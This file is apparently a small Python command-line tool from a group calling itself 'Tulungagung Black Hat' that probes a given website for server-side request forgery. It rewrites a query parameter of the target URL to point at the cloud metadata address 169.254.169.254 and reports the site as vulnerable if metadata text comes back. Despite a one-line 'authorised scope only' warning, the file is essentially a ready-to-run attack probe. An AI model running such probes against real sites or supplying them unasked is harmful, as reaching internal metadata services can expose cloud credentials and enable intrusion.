#!/usr/bin/env python3
# TBH-SSRF - Detector (Educational - Use Burp Collaborator)
import requests, argparse, json, urllib.parse

BANNER = """\033[91m╔════════════════════════════════════╗
\033[91m║ \033[97mTBH-SSRF \033[91m- Detector               \033[91m║
\033[91m║ \033[90mTulungagung Black Hat | uchil404 \033[91m║
\033[91m╚════════════════════════════════════╝\033[0m"""

def check(url, collaborator="http://169.254.169.254/latest/meta-data/"):
    parsed=urllib.parse.urlparse(url)
    qs=urllib.parse.parse_qs(parsed.query)
    if not qs:
        test_url=f"{url}?url={urllib.parse.quote(collaborator)}"
    else:
        k=list(qs.keys())[0]
        qs[k]=collaborator
        test_url=urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)))
    try:
        r=requests.get(test_url,timeout=5,headers={'User-Agent':'TBH-SSRF/1.0'})
        # Simple heuristic: if response contains metadata or 200 with collaborator
        vulnerable="meta-data" in r.text.lower() or collaborator in r.text
        return {"url":test_url,"status":r.status_code,"vulnerable":vulnerable,"length":len(r.text)}
    except Exception as e:
        return {"url":test_url,"error":str(e),"vulnerable":False}

def main():
    print(BANNER)
    print("\033[91m[!] Hanya untuk scope yang diizinkan! Gunakan Burp Collaborator untuk PoC real!\033[0m\n")
    parser=argparse.ArgumentParser(description="SSRF")
    parser.add_argument("-u","--url",required=True,help="URL dengan param ?url=")
    parser.add_argument("--json",help="Save JSON")
    args=parser.parse_args()
    print(f"[*] Testing {args.url} dengan payload metadata")
    result=check(args.url)
    if result.get("vulnerable"):
        print(f"\033[91m[!] Potensi SSRF! {result['url']} -> {result['status']}\033[0m")
    else:
        print(f"\033[92m[✓] Tidak terdeteksi SSRF [{result.get('status')}] - butuh collaborator real\033[0m")
    if args.json:
        open(args.json,'w').write(json.dumps(result,indent=2)); print(f"[✓] JSON: {args.json}")

if __name__=="__main__": main()
